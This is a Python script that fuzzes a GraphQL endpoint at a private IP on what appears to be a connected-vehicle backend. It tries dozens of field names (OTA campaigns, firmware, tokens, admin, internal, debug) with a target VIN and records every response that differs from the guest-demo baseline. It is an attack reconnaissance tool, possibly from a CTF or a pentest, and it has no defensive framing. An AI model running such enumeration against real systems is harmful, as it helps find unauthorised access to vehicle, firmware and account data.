import itertools, json, requests
URL = "http://10.230.164.2:8080/graphql"
BASE = '{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
fields = ["vehicles","vehicle","me","viewer","user","currentUser","session","sessions",
 "ota","otas","otaCampaign","otaCampaigns","campaign","campaigns","firmware","firmwares",
 "package","packages","artifact","artifacts","release","releases","update","updates",
 "diagnostic","diagnostics","dtc","dtcs","ecu","ecus","gateway","gateways","tbox",
 "telemetry","trip","trips","order","orders","account","accounts","org","organization",
 "fleet","fleets","device","devices","token","tokens","login","authenticate","signIn",
 "config","settings","node","nodes","admin","internal","engineering","debug","system",
 "health","status","info","version"]
args = ['', '(vin:"CV6FF52FEE9EDDD86")', '(id:"CV6FF52FEE9EDDD86")', '(vehicleId:"CV6FF52FEE9EDDD86")']
hits = []
s = requests.Session()
for f, a in itertools.product(fields, args):
    q = '{' + f + a + '{__typename}}'
    try:
        r = s.post(URL, json={"query": q}, timeout=5)
        t = r.text.strip()
        if t != BASE:
            hits.append((q, r.status_code, t[:300]))
            print("DIFF:", q, "->", r.status_code, t[:300], flush=True)
    except Exception as e:
        print("ERR", q, e)
print("done; diffs =", len(hits))
